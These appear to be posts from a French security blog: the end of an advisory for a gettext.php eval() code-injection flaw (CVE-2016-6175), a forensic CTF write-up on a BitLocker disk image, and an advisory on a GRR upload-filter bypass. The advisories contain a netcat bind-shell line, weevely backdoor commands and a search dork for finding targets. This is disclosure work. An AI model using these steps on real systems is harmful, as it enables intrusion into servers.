(*since php 5.3.0* *because it can be easily bypassed
by adding a Null Byte*) **eregi()**
regexp function in order to valid they match the following
pattern:
***plural-forms:
([^\n]\*)\n***
(This regular expression matching have no effect on our payload)

Next step will be to sanitize the obtained expression string before
to practice the fatal eval() on this one.

Here is the impacted code snippet :

*snip...*
 *if (eregi("plural-forms:
([^\n]\*)\n", $header, $regs))*
 *$expr = $regs[1];*
 *else*
 *$expr = "nplurals=2;
plural=n == 1 ? 0 : 1;";*

 *$this->pluralheader
= $this→**sanitize\_plural\_expression($expr)****;***//
The
vulnerable function!!
 *}*
*snip…*

The comments presents at the beginning of
**sanitize\_plural\_expression()** function explain that this one is
here to prevent the **eval()** function attacks called later.

Comments are :
*/\*\* Sanitize plural form expression for use
in PHP eval call.*

 *@access private*
 *@return string sanitized plural form
expression\*\*/*

In fact, the security is guaranteed by a "preg\_replace"
that not permit us to inject specials chars.

*snip...*
function sanitize\_plural\_expression($expr) {

 // Get rid of disallowed characters.
 $expr =
preg\_replace('@[^a-zA-Z0-9\_:;\(\)\?\|\&=!<>+\*/\%-]@', '',
$expr); // « sanitizer »

 // Add parenthesis for tertiary '?'
operator.
 $expr .= ';';
 $res = '';
 $p = 0;
 for ($i = 0; $i < strlen($expr); $i++) {
// no indentation ?
 $ch = $expr[$i];
 switch ($ch) {
 case '?':
 $res .= ' ? (';
 $p++;
 break;
 case ':':
 $res .= ') : (';
 break;
 case ';':
 $res .= str\_repeat( ')', $p) . ';';

 $p = 0;
 break;
 default:
 $res .= $ch;
 }
 }
 return $res;
 }
*snip...*

Code snippet from the vulnerable function that execute eval() on the "sanitized" string :

*snip…*
 $string = $this->get\_plural\_forms();
 $string =
str\_replace('nplurals',"\$total",$string);
 $string = str\_replace("n",$n,$string);
 $string =
str\_replace('plural',"\$plural",$string);

 $total = 0;
 $plural = 0;

  eval("$string");
// eval called
…. launch my shell baby !
*snip…*

However, for example (but not only!) we can call **system**()
function with « sh » parameter in order to launch a /bin/sh
command on the targeted system and allowing us to gain an interactive
shell with application privileges on it.

A real scenario could be that a real attacker overwrites languages
files located in the /nagvis-1.8.5/share/frontend/nagvis-js/locale/
directory, in an internal repository, a Docker shared folder or any
other folder.

He now just have to wait or to execute the payload himself to obtain
his shell, that’s why this vulnerability is not so harmless !

Note :

*Apart from that we could
imagine that the attacker transform the **$expr** variable to
obtain an interactive remote shell without eval() and with (maybe)
more privileges like this :*
*$expr=
(`nc -l -p 1337 -e /bin/sh`);* //
proof of concept and screenshots joined to this advisory

Like a Perl developer could say: « there is more than one way
to do it »
IV. PROOF OF CONCEPT

Following PHP code reproduce the exploitation concept base on the
1.0.9 version
(without a crafted .mo file and joined with this advisory).

V. RECOMMENDATIONS

As explained in the
associated « bug track », it was assumed that PO and MO files would
come from untrusted translators.
Check the
permissions on PO/MO files in order to ensure the provenance and the
fact that is only accessible from trusted parties.

The project's
members are writing a new version that will patch this issue
definitively, thank you to respect their work and to apply this
temporary fix.

VI. VERSIONS AFFECTED

This issue affect the latest GETTEXT .PHP version and were found
in latest stable NAGVIS (1.8.5) version.
It could affect the a lot of web application and/or many website as
long as it will not be updated.

VII. TIMELINE

**June 21th, 2016**: Vulnerability identification
**June 21th, 2016**: Nagvis project developers and gettext.php developers
notification
**June 22th, 2016**: Nagvis project developers response
**June 25th, 2016**: Nagvis Patch release (even if not really affected)
**June
27****th,
2016**: Gettext.php
team response (from Danilo Šegan), exchange started
**July 5th, 2016**:
CVE request ID (mitre) and OVE ID request
**July 7th, 2016**:
***CVE-2016-6175*** attributed by MITRE
**July 25th, 2016**: Public disclosure

VIII. LEGAL NOTICES

The information contained within this advisory is supplied "as-is"
with
no warranties or guarantees of fitness of use or otherwise.

I accept no responsibility for any damage caused by the use or misuse
of this advisory.

[CVE-2016-6175] gettext.php code execution - PoC example:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKFOfVjdEf47tJ1KcjuePCuJai7aKaiyomu6trOjKr5Zv2R8KxtST2h03w1E7yXksQJ_23iJZGIvI3X0Mb5BHU48kuhNY73DEyI6PMWidVf0Z7FL7tUy2xgjdQylVJG2Wj9Pn-CQDwXbhB/s640/cve-2016-6175.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKFOfVjdEf47tJ1KcjuePCuJai7aKaiyomu6trOjKr5Zv2R8KxtST2h03w1E7yXksQJ_23iJZGIvI3X0Mb5BHU48kuhNY73DEyI6PMWidVf0Z7FL7tUy2xgjdQylVJG2Wj9Pn-CQDwXbhB/s1600/cve-2016-6175.png)

Publié par

[kmkz](https://www.blogger.com/profile/11354372095868320290 "author profile")

à

[13:34](https://kmkz-web-blog.blogspot.com/2016/07/advisory-cve-2016-6175.html "permanent link")

[Aucun commentaire:](https://www.blogger.com/comment/fullpage/post/4457623080129847893/1065233655939428122)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4457623080129847893&postID=1065233655939428122&from=pencil "Modifier l'article")

## 2016/03/05

### [[Write-Up] ESGI CTF 2k16 ForensicGio (Forensic 400)](https://kmkz-web-blog.blogspot.com/2016/03/write-up-esgi-ctf-2k16-forensicgio.html)

Salut à tous,

ce jeudi avait lieu le **CTF du Security Day 2016** de l'[**ESGI** Paris](http://hacklab-esgi.fr/) et auquel notre team **sec0d** participait enfin du moins ceux qui étaient là :P.

Durant ce CTF nombre de challz ont été poncés mais un en particulier sur lequel j'ai passé un moment me donne envie d'écrire ce write-up car j'avoue l'avoir pas mal apprécié (merci**@Sug4r7** de l'avoir concocté).

Allez, allons-y et arrêtons de "blablater" !

Le début du chall débute par la récupération de 2 archives tar.gz.

L'une contenant le chall et l'autre son checksum md5 pour valider de son intégrité, l'objectif pour valider ce chall étant de récupérer un flag ainsi qu'une adresse mail, allez, on se lance!!

Ces fichiers downloadés on check le md5 puis on extract le contenu de l'archive et faisons un "file" dessus afin de déterminer ce à quoi nous avons affaire:

> # cat CTF\_security\_day\_2016.tar.gz.md5
>
> **2b5dfdabf403b309c35d72b455a96201**:CTF\_security\_day\_2016.tar.gz
>
>
>
> # md5sum CTF\_security\_day\_2016.tar.gz
>
> **2b5dfdabf403b309c35d72b455a96201**

L'archive extraitre révèle un format appelé **EWF** (Expert Witness Compression Format) généré par certains tools de dump de media et/ou partitions tel que **ewfacquire** sous linux.

Ayant pu identifier la facilité de certains challs présent je tente un "string"

dessus et jouant avec "grep" afin de voir si j'en ressort quelques chose mais .. ce chall n'est pas aussi facile, poursuivons.

Kali Linux possède nativement nombre de tools pour jouer avec les dumps ewf alors je teste  **ewfinfo** dans une première approche de collecte d'info et, une fois le fichier renommé avec l'extension (**.s01**) qui va bien, j'obtiens déjà quelques résultat:
> ```
> ewfinfo CTF_security_day_2016.s01
> ewfinfo 20140608
>
> Acquiry information
>         Case number:                1
>         Description:                Security Day ESGI 2016 - Level: easy
>         Examiner name:              IT Forensic investigator
>         Evidence number:            1
>         Notes:                      578589-646712-118349-156013-637549-351670-297187-312191
>         Acquisition date:           Thu Mar  3 03:17:59 2016
>         System date:                Thu Mar  3 03:17:59 2016
>         Operating system used:      Linux
>         Software version used:      20130416
>         Password:                   N/A
>         Model:                      DataBar USB2.0
>
> EWF information
>         File format:              EnCase 6
>         Sectors per chunk:        64
>         Error granularity:        64
>         Compression method:       deflate
>         Compression level:        best compression
>         Set identifier:           6e1ec0c6-715f-f848-9119-e59a9b00dcc0
>
> Media information
>         Media type:                removable disk
>         Is physical:               yes
>         Bytes per sector:          512
>         Number of sectors:         2015232
>         Media size:                984 MiB (1031798784 bytes)
>
> Digest hash information
>         MD5:                        fff71a85859a1af7ede437178d701809
>         SHA1:                       cf0b504bd9ea6e1b7183c9652ed3a402f12b4551
> ```

Ok, première info intéréssante, pour la suite nous allons donc extraire le contenu du dump vers un format plus standard à l'aide de l'outils **ewfexport**

L'outil une fois lancé demande vers quel format l'extraire etc.. il suffit de laisser cela par défaut puis de donner un nom de fichier une fois qu'il le demander.

Il s'appelera donc "CTF2.raw" pour la suite.

De là je me dis que peut-être serait-il possible de récupérer quelque chose via un peu de file carving, je lance donc un "**foremost**", hélas son output nous ramène à la raison: non ce ne sera pas aussi simple malgrès le "easy" ci-dessus!!

> ```
> Foremost started at Fri Mar  4 01:19:56 2016
> Invocation: foremost CTF2.raw
> Output directory: /root/Bureau/CTF/ESGI/foren/output
> Configuration file: /etc/foremost.conf
> ------------------------------------------------------------------
> File: CTF2.raw
> Start: Fri Mar  4 01:19:56 2016
> Length: 984 MB (1031798784 bytes)
>
> Num         Name (bs=512)               Size         File Offset         Comment
>
> Finish: Fri Mar  4 01:20:12 2016
>
> 0 FILES EXTRACTED
>
> ------------------------------------------------------------------
>
> Foremost finished at Fri Mar  4 01:20:12 2016
> ```

Okay okay ... voyons donc voir la table de partition présente sur ce dump grâce à l'outils **mmls**.

> ```
> mmls CTF2.raw
>
> DOS Partition Table
> Offset Sector: 0
> Units are in 512-byte sectors
>
>    Slot      Start        End          Length       Description
>
> 000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
> 001:  -------   0000000000   0000002047   0000002048   Unallocated
> 002:  000:000   0000002048   0002015231   0002013184   NTFS / exFAT (0x07)
> ```

Une  partition windows semble bien présente, un simple "file" dessus indique même "**DOS/MBR Boot Sector**" ce qui indique donc que ce serait probablement bootable.

Après quelque manipulations foireuses et bricolages en tout genre, je découvre un tools appelé [**mbr\_parser.py**](https://raw.githubusercontent.com/gleeda/misc-scripts/master/misc_python/mbr_parser.py) permettant de parser ce type de fichier et d'en remonter certaines infos ce qui permet donc d'affirmer que non, pas bootable :-/

> ```
> ===== Partition Table #1 =====
> Boot flag: 0x0
> Partition type: 0x7 (NTFS)
> Starting Sector (LBA): 0x800 (2048)
> Starting CHS: Cylinder: 0 Head: 32 Sector: 33
> Ending CHS: Cylinder: 125 Head: 112 Sector: 51
> Size in sectors: 0x1eb800 (2013184)
>
>
>
> ===== Partition Table #2 =====
> Boot flag: 0x0
> Partition type: 0x0 (Empty)
> Starting Sector (LBA): 0x0 (0)
> Starting CHS: Cylinder: 0 Head: 0 Sector: 0
> Ending CHS: Cylinder: 0 Head: 0 Sector: 0
> Size in sectors: 0x0 (0)
>
>
>
> ===== Partition Table #3 =====
> Boot flag: 0x0
> Partition type: 0x0 (Empty)
> Starting Sector (LBA): 0x0 (0)
> Starting CHS: Cylinder: 0 Head: 0 Sector: 0
> Ending CHS: Cylinder: 0 Head: 0 Sector: 0
> Size in sectors: 0x0 (0)
>
>
>
> ===== Partition Table #4 =====
> Boot flag: 0x0
> Partition type: 0x0 (Empty)
> Starting Sector (LBA): 0x0 (0)
> Starting CHS: Cylinder: 0 Head: 0 Sector: 0
> Ending CHS: Cylinder: 0 Head: 0 Sector: 0
> Size in sectors: 0x0 (0)
>
>
>
> Valid Signature (0xaa55): True => (0xaa55)
> ```

Nous savons alors que ce ne sera pas bootable en l'état, ok, j'ai donc pratiqué à l'extraction de chacune des partition à l'aide de **dd** en espérant que la bonne partition pourra être montée et que ce sera alors la fin de ce chall.

Nous avions donc obtenu la liste des partitions et pouvions à préent les extraire de ce dump:
> ```
> dd if=CTF2.raw of=CTF2_0.bin bs=512 skip=0 count=1
> dd if=CTF2.raw of=CTF2_1.bin bs=512 skip=2048 count=2015231
>
> file *.bin
> CTF2_0.bin: DOS/MBR boot sector; partition 1 : ID=0x7, start-CHS (snip)
> CTF2_1.bin: DOS/MBR boot sector, code offset 0x58+2, OEM-ID "-FVE-FS-" (snip)
> ```

en revanche lors de divers essais, il s'est avéré impossible de monter le volume souhaité sur ma linux, cette partition n'étant visiblement pas "standard".

A partir de la, changement de stratégie.

Le mount ne passant toujours pas en **vfat** via **dd** ainsi qu'avec l'outils **ewfmount** sur le premier dump ewf de l'archive, nous comprenons qu'il faut essayer autre chose.
> ```
> dd if=CTF2.raw of=new.img count=1 bs=1000MiB
> file new.img
> new.img: DOS/MBR boot sector; partition 1 (snip)
>
> ```

L'idée sera donc la suivante:

1. prendre le fichier new.img et le convertir en  vmdk via qemu
2. rattacher ce vmdk à une machine virtuelle Windows et essayer de monter le volume

C'est la que mon coéquipier **Orikata** et sa machine sont intervenus!

La converion via Qemu faite`:`
> ```
>  /qemu-img convert -f raw -O vmdk /Volumes/xxx/new.img /Volumes/xxx/new.vmdk
> ```

il suffit de rattacher le vmdk en tant que volume à une VM Windows puis... SURPRISE!!

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS_750q6nYClYalWSSWSrOvmnQfHoGWjUwuonVs53ZyJwxh7kG6xJDglAS-PfiVVrgf5-17zHMZQzO6Tq9yTOXMeqa7FNUVb-I2JsANIFDiXgrAT1RGr5X5CrPF6wXLUwNIVr-8hZe86ZD/s640/F511BF5A-8944-4900-9F27-16B6D38427C7.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS_750q6nYClYalWSSWSrOvmnQfHoGWjUwuonVs53ZyJwxh7kG6xJDglAS-PfiVVrgf5-17zHMZQzO6Tq9yTOXMeqa7FNUVb-I2JsANIFDiXgrAT1RGr5X5CrPF6wXLUwNIVr-8hZe86ZD/s1600/F511BF5A-8944-4900-9F27-16B6D38427C7.png)

Un volume Bitlocker!

Voici donc la raison du temps perdu à tenter de le monter en vain sur ma Kali :/.

Ok, à partir de la comment faire pour monter ce volume sans la clef?

Et bien compliqué mais **Orikata** se rappellant qu'il est possible de monter le container via la clef de récupération via l'onglet "j'ai oublié mon mot de passe"

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjY3TuQnUFqmqy3bKhbGMMLrFQPitO8kwvc-TYY8xU6xx7UgYsfkHOhzJUxXZfcsnUK9Edbd4fn6knSoJt4VgbYu8d_Gzy34e_bnVx1wftMVVe9BMzBmrQDlT_aBD11r8um-F3riUiiOV6F/s320/1D414877-E30E-4D50-972D-D781EF16C1A4.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjY3TuQnUFqmqy3bKhbGMMLrFQPitO8kwvc-TYY8xU6xx7UgYsfkHOhzJUxXZfcsnUK9Edbd4fn6knSoJt4VgbYu8d_Gzy34e_bnVx1wftMVVe9BMzBmrQDlT_aBD11r8um-F3riUiiOV6F/s1600/1D414877-E30E-4D50-972D-D781EF16C1A4.png)

et que cette dernière est de la forme **8 x 6** chars séparés par des "**-**".

Nous nous replongeons dans la collecte d'info faites en amont et remarquons quelques chose d'étrange.

Il s'agit d'une note contenue dans les métadata du dump initial ewf et qui n'est sûrement pas le fruit du hasard rappellez-vous de cela:

ewfinfo CTF\_security\_day\_2016.s01
ewfinfo 20140608

Acquiry information
        Case number:                1
        Description:                Security Day ESGI 2016 - Level: easy
        Examiner name:              IT Forensic investigator
        Evidence number:            1
        Notes:                     **578589-646712-118349-156013-637549-351670-297187-312191**
        Acquisition date:           Thu Mar  3 03:17:59 2016
        System date:                Thu Mar  3 03:17:59 2016
        Operating system used:      Linux
        Software version used:      20130416
        Password:                   N/A
        Model:                      DataBar USB2.0

Nous tentons alors de pratiquer de cette manière afin de bypasser la clef du Bitlocker et...

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPXOdZuvNxOWEF6C_UtzXYWpLzuP_hfZPWH6Q-QPKJE5bYz2Bc8gpa4LFziphvIgzZbDVgebWO3aXCtpLoPGjIST_RXBTxsN8a58Q5dtuCPJSgq8INLUwrYszQ2LFJY036wiZJqSoriPej/s640/475B08A3-79B3-43E4-A4B5-B9E6218E5087.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPXOdZuvNxOWEF6C_UtzXYWpLzuP_hfZPWH6Q-QPKJE5bYz2Bc8gpa4LFziphvIgzZbDVgebWO3aXCtpLoPGjIST_RXBTxsN8a58Q5dtuCPJSgq8INLUwrYszQ2LFJY036wiZJqSoriPej/s1600/475B08A3-79B3-43E4-A4B5-B9E6218E5087.png)

Le container nous offre deux fichiers: le 1er contenant juste un peu de texte rappellant les obectifs du challenges, le second quant à lui étant un .psd que l'on s'empresse d'ouvrir sous **Gimp** ce qui nous permet d'identifier des claques présent cachant un flag dans la bouche d'un espèce de dinosaure.

Image de base avec la bonne promo pour la boite de notre ami @Sug4r7 qui a créer ce chall:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvogQbI7XXI5kQHHHwG0k9AbsOIjILKswt1Wtdld6pEvBBIwmVcn4pxV3TxV58UahvHGXzk5D3eU5ISNMdrrdDtFyS1kwOI2KUiTuPFR0l3HkW7GaaBMJ0cC35TcW6EAkNhNeMT-lbsW05/s640/CTF_1.info.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvogQbI7XXI5kQHHHwG0k9AbsOIjILKswt1Wtdld6pEvBBIwmVcn4pxV3TxV58UahvHGXzk5D3eU5ISNMdrrdDtFyS1kwOI2KUiTuPFR0l3HkW7GaaBMJ0cC35TcW6EAkNhNeMT-lbsW05/s1600/CTF_1.info.png)

 Les filtres:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTolq-mxzi1qjzrSMFGwY7YqD7YuyIhFH5MSoW78gaSnKVxTNhu_2p0NA7Z-HhbgIdltSBy2LKZdBtPiCMkQZKQ99FO7sxnNGTECz3eCKCid4bFgOnEZ1XrHcSp0hmrEKUzcsJhhLnItIe/s400/unnamed.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTolq-mxzi1qjzrSMFGwY7YqD7YuyIhFH5MSoW78gaSnKVxTNhu_2p0NA7Z-HhbgIdltSBy2LKZdBtPiCMkQZKQ99FO7sxnNGTECz3eCKCid4bFgOnEZ1XrHcSp0hmrEKUzcsJhhLnItIe/s1600/unnamed.png)

Le filtre "code\_ctf" attire immédiatement notre attention mais hélas se trouve illisible:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRJM_vS-gVsgoNcYUeIl1GNM-ZCEYUr-xnDYegJZETp0wD_ONRp5943jSkQAfk_b3d5K8ugakL7ir7JaMjQcwlBXMn8JWPGSbb2pgFgXp4bDwwvT9MKHm8zd-F3FUGtXbzCw0xqQIp1XPV/s400/index.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRJM_vS-gVsgoNcYUeIl1GNM-ZCEYUr-xnDYegJZETp0wD_ONRp5943jSkQAfk_b3d5K8ugakL7ir7JaMjQcwlBXMn8JWPGSbb2pgFgXp4bDwwvT9MKHm8zd-F3FUGtXbzCw0xqQIp1XPV/s1600/index.png)

Afin de gagner du temps, je décide donc de lire les métadata du fichier image de base via **exiftool** et obtient entre autre alors le fameux flag tant désiré.

> ```
> ExifTool Version Number         : 10.11
> File Name                       : CTF_1.info
> Directory                       : .
> File Size                       : 22 MB
> File Modification Date/Time     : 2016:03:03 01:42:37+01:00
> File Access Date/Time           : 2016:03:05 15:45:08+01:00
> File Inode Change Date/Time     : 2016:03:04 04:33:39+01:00
> File Permissions                : rwxrwxrwx
> File Type                       : PSD
> File Type Extension             : psd
> MIME Type                       : application/vnd.adobe.photoshop
> Num Channels                    : 3
> Image Height                    : 1600
> Image Width                     : 2560
> Bit Depth                       : 8
> Current IPTC Digest             : cdcffa7da8c7be09057076aeaf05c34e
> Coded Character Set             : UTF8
> Application Record Version      : 0
> IPTC Digest                     : cdcffa7da8c7be09057076aeaf05c34e
> XMP Toolkit                     : Adobe XMP Core 5.5-c021 79.155772, 2014/01/13-19:44:00
> Document ID                     : adobe:docid:photoshop:8e502fea-e0d3-11e5-88dd-8346bba80fd1
> Instance ID                     : xmp.iid:a366f090-0622-9343-b206-ee4e314c205f
> Original Document ID            : 54597A271ED407F91E4348F2B8D7EDD3
> History Action                  : saved, converted, derived, saved, saved
> History Instance ID             : xmp.iid:4e124a83-f328-dd45-bc25-d93c357610c7, xmp.iid:229920ec-c5e4-f34c-84f6-4a06983a49ff, xmp.iid:a366f090-0622-9343-b206-ee4e314c205f
> History When                    : 2016:03:03 01:05:46+01:00, 2016:03:03 01:05:46+01:00, 2016:03:03 01:42:37+01:00
> History Software Agent          : Adobe Photoshop CC 2014 (Windows), Adobe Photoshop CC 2014 (Windows), Adobe Photoshop CC 2014 (Windows)
> History Changed                 : /, /, /
> History Parameters              : from image/jpeg to application/vnd.adobe.photoshop, converted from image/jpeg to application/vnd.adobe.photoshop
> Derived From Instance ID        : xmp.iid:4e124a83-f328-dd45-bc25-d93c357610c7
> Derived From Document ID        : 54597A271ED407F91E4348F2B8D7EDD3
> Derived From Original Document ID: 54597A271ED407F91E4348F2B8D7EDD3
> Format                          : application/vnd.adobe.photoshop
> Color Mode                      : RGB
> Text Layer Name                 : code_ctf
> Text Layer Text                 : CODE CTF: 20160303_A27R425
> Document Ancestors              : 54597A271ED407F91E4348F2B8D7EDD3
> Create Date                     : 2016:03:03 00:59:27+01:00
> Metadata Date                   : 2016:03:03 01:42:37+01:00
> X Resolution                    : 72
> Displayed Units X               : inches
> Y Resolution                    : 72
> Displayed Units Y               : inches
> Global Angle                    : 30
> Global Altitude                 : 30
> Photoshop Thumbnail             : (Binary data 4789 bytes, use -b option to extract)
> Has Real Merged Data            : No
> Writer Name                     : Adobe Photoshop
> Reader Name                     : Adobe Photoshop CC 2014
> Exif Byte Order                 : Big-endian (Motorola, MM)
> Bits Per Sample                 : 8 8 8
> Photometric Interpretation      : RGB
> Orientation                     : Horizontal (normal)
> Samples Per Pixel               : 3
> Resolution Unit                 : inches
> Software                        : Adobe Photoshop CC 2014 (Windows)
> Modify Date                     : 2016:03:03 01:42:37
> Exif Version                    : 0221
> Color Space                     : Uncalibrated
> Exif Image Width                : 2560
> Exif Image Height               : 1600
> Compression                     : JPEG (old-style)
> Thumbnail Offset                : 386
> Thumbnail Length                : 0
> Image Size                      : 2560x1600
> Megapixels                      : 4.1
> ```

**CODE CTF: 20160303\_A27R425**

Malheureusement il ne nous permis pas de valider cette épreuve car sans l'adresse mail du destinataire impossible de le valider.... frustration extême car cela nous pris tout de même pas mal de temps pour au final 0 points!

Cela étant, ça méritait bien un petit write-up ne serait-ce que parcequ'il ne fû validé qu'une seule fois par la team gagnante et que d'autre aimerait sûrement savoir comment il fallait procéder ;-).

Le mail pour sa part ne semblait réèllement pas présent ici, en tout cas pas à notre connaissance et la fin de ce CTF arriva avec pour la **sec0d** la 5ème place et des cadeaux tout de même obtenus!! :-)

A bientôt pour un prochain writeup ou paper.

kmkz

**Quelques liens utiles pour ce challenge Forensic**

[mmls](http://www.sleuthkit.org/sleuthkit/man/mmls.html)

[mbr\_parser.py](https://raw.githubusercontent.com/gleeda/misc-scripts/master/misc_python/mbr_parser.py)

[ForensicWiki](http://www.forensicswiki.org/wiki/Encase_image_file_format)

[EWF tools](http://www.forensicswiki.org/wiki/Libewf)

<http://www.cnwrecovery.com/html/e01_and_virtual.html>

<http://blog.stalkr.net/2010/05/defcon-18-ctf-quals-writeup-forensics.html>

(en souvenir pour les kewpins: sec0d à la remise des prix)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1pt5BAOPfqd_25nMUyWS94kVI_wjPHuRKJ9czS7AybL_o_MXWb105VgznKckHsiz623sr-quaNne6IaOPWjesvgUoKLjJhLZoavPcSDdxHwJsYOcOUXW6_XInnBItczHcONYJrupTcN74/s640/sec0d.jpeg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1pt5BAOPfqd_25nMUyWS94kVI_wjPHuRKJ9czS7AybL_o_MXWb105VgznKckHsiz623sr-quaNne6IaOPWjesvgUoKLjJhLZoavPcSDdxHwJsYOcOUXW6_XInnBItczHcONYJrupTcN74/s1600/sec0d.jpeg)

Publié par

[kmkz](https://www.blogger.com/profile/11354372095868320290 "author profile")

à

[18:21](https://kmkz-web-blog.blogspot.com/2016/03/write-up-esgi-ctf-2k16-forensicgio.html "permanent link")

[Aucun commentaire:](https://www.blogger.com/comment/fullpage/post/4457623080129847893/1073820262794932851)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4457623080129847893&postID=1073820262794932851&from=pencil "Modifier l'article")

## 2016/01/17

### [[Advisory] CVE-2016-1000300 Vulnérabilité dans GRR <= 3.0.0-RC1](https://kmkz-web-blog.blogspot.com/2016/01/advisory-vulnerabilite-dans-grr-300-rc1.html)

Salut à tous!

Nouvelle année, nouveaux ponçages et comme j'ai l'impression que nombres de vulns encore présentes ne devraient plus l'être depuis longtemps, je me permet un petit retour sur un de mes récents advisory.

En effet, il est question ici d'un cas d'école que j'ai eu le plaisir de découvrir récemment sur un outils de réservation de salles... en fait on pourrait se dire "ouai super.. so what!??"

Mais lorsque cet outil vous permet de pwn une infra lors d'un pentest et de plus est présent sur **TOUTES** les versions de cette application utilisée par nombre d'institutions notamment FR,  je pense qu'il peut être pertinent d'en parler.

Toutefois  et avant de rentrer dans la vuln + l'advisory lui-même je tiens à remercier les personnes maintenant ce projet open source avec qui j'ai pu échanger afin de permettre de travailler sur un correctif de sécurité qui sera donc backporté et inclu dans la future version de l'application.

Vous trouverez les ressources nécéssaires en fin d'article comme d'habitude sur le blog.

Assez parler place aux détails! :D

Ici tout d'abord le code vulnérable se trouvant dans le fichier "**admin/admin\_config1.php**" du projet [GRR](http://grr.devome.com/) ainsi que son lien direct vers pastebin.com:

Bon comme vous pourrez le constater les parties intéréssantes sont déjà commentées expliquant ainsi les grandes lignes de ce qui nous intéresse.

On identifie ici 3 problèmes sur ce code:

**1-** On peu bypass le filtre d'upload car ce dernier n'effectue qu'un seul test: l'extension!

Ainsi une double extension (**backdoor.php.png**) permet de contourner cela aisément

**2-** Ce super script php sorti tout droit des années 90' nous permet de déterminer le noms qu'aura notre backdoor ainsi que son chemin.

En effet, le script va simplement supprimer la seconde extension et comme il effectue un explode() sur notre fichier afin de récupérer ce qui se situe derrière notre ".", il va le renommer en "logo.php" car le 2ème élément du tableau "$tab" sera bel et bien notre extension... php ou autre par ailleurs ;-).

**3-** Ici c'est la petite touche finale: le fichier sensé être un logo se retrouve "chmod 666"  (RW pour tout le monde) ce qui permet en prime d'obtenir les droits nécéssaires.

En effet, pour peu que les droits soient bien gérés il serait difficile de faire exécuter ce que l'on souhaite, hors la tout est possible, on peux même grâce à cela obtenir des privilèges largements supérieurs à ceux attendus chose que j'ai pu tester et surtout réussir en gagnant ainsi les droits **NT Authority\System** sur un environnement Microsoft de manière triviale!

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQ7WR_S6dMjEtenlTwXeEip-nXEEoDCF2aHnpUKK4KhhYuDsK3zpRmxAVC6vU1Kz2gC6zkbkPvfitEo9A0JSF2znBQxV2TsC7l1rKd5Xg-0oieh_TzUCz3ysB9Z8yMk14rVnGdLXCtMKRI/s1600/system_rights.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQ7WR_S6dMjEtenlTwXeEip-nXEEoDCF2aHnpUKK4KhhYuDsK3zpRmxAVC6vU1Kz2gC6zkbkPvfitEo9A0JSF2znBQxV2TsC7l1rKd5Xg-0oieh_TzUCz3ysB9Z8yMk14rVnGdLXCtMKRI/s1600/system_rights.png)

Vous l'aurez compris, c'est assez easy à exploiter sous condition toutefois d'avoir des privilèges au départ afin de pouvoir modifier le logo en question (ce qui m'a été possible via une **SQLI** sur une application tierce mais qui par ailleurs ne me permettait pas d'obtenir de shell... ce qui fût donc réglé grâce au GRR présent).

Je vous laisse ici le soin de lire l'advisory en question ainsi que les différents liens concernant ce dernier.

Ce fût court et assez faiblement technique mais il est vrai que ce genre de vuln existe encore alors autant les étudiers car comem dis en début d'article: ce sont des cas d'écoles que l'on ne devrait même plus trouver hélas!!

**=================================================================================================**

**Public Advisory**

**=================================================================================================**

Title: GRR <= 3.0.0-RC1 (all versions) file upload filter bypass (authenficated)  + privilege escalation(in some case)

Date: January 7th, 2016

Vendor Homepage: http://grr.devome.com/fr/

Software Link: [GRR project](http://grr.devome.com/fr/telechargement/category/3-versions-patch?download=7:grr-3-0-0-rc1)

Dork: inurl:/grr/ intext:réservation intitle:"GRR"

CVSS score: **9.9**

OVE ID: **OVE-20160705-0044**

CVE ID: **CVE-2016-1000300**

**I. APPLICATION

======================================================================================**

GRR is an open source resources manager tool used in many french public

institutions (not only!).

It permit for example to manage rooms reservations, and so much more.

**II. ADVISORY

======================================================================================**

The application allows administrators to change the enterprise's logo

uploading a new image with .png,.jpg or .gif extension only.

Once uploaded, image name is "splitted" in an array and renamed with the

name "logo" followed by the extention saved as 2nd array's element.

This file called for example "logo.jpg" is also "chmoded" as 0666 permission

and directly accessible in image folder (img\_grr by default) by all users.

Besides, the application does only a basic conditional php test

on the extension of the uploaded file.

It's possible for an attacker to add a second extension that will be

used when the image will be renamed in order to bypass this basic filter

(double extension upload filter bypassing).

So, a file called backdoor.php.jpg will be renamed as logo.php with

chmod 0666 permissions and could be used by attacker to gain more privileges

on the targeted server (privesc due to bad file permissions and RCE).

To trigger this vulnerability it is necessary to have an administrator

account on the GRR application.

This vulnerability is a combination of 3 issues:

1. - predictable uploaded file names and path
2. - upload of any kind of file
3. - bad files permission when we upload this file that permit us to gain privilegied access.

Note that it could be "dorkable" in order to find targets ... and sometimes

with trivial admin credentials ;-).

 **III. PROOF OF CONCEPT

======================================================================================**

Generate backdoor:

 *kmkz@Tapz:~#  weevely generate pass123 /tmp/3lrvs.php

    Generated backdoor with password 'pass123' in '/tmp/3lrvs.php' of 1486 byte size.

    kmkz@Tapz:~# mv /tmp/3lrvs.php /tmp/3lrvs.php.jpg*

Login as admin and upload this new 'logo' > Administration > logo

Enjoy your shell!

*kmkz@Tapz:~# weevely http://laboratoire.target.fr/images/logo.php pass123

